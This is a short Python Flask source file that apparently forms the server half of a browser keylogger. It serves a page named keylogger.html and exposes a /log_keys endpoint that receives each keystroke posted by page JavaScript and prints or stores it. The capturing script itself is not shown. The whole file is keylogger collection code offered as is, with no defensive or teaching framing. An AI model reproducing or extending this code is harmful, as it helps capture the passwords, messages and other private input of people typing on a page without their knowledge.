from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Home route to load keylogger.html
@app.route('/')
def home():
    return render_template('keylogger.html')

# Endpoint to receive logged key data from JavaScript
@app.route('/log_keys', methods=['POST'])
def log_keys():
    if request.method == 'POST':
        key_data = request.json.get('key')  # Get the key pressed
        print(f"Key logged: {key_data}")  # Print to the console or save to a file
        return jsonify({"status": "success", "key": key_data})

if __name__ == '__main__':
    app.run(debug=True)
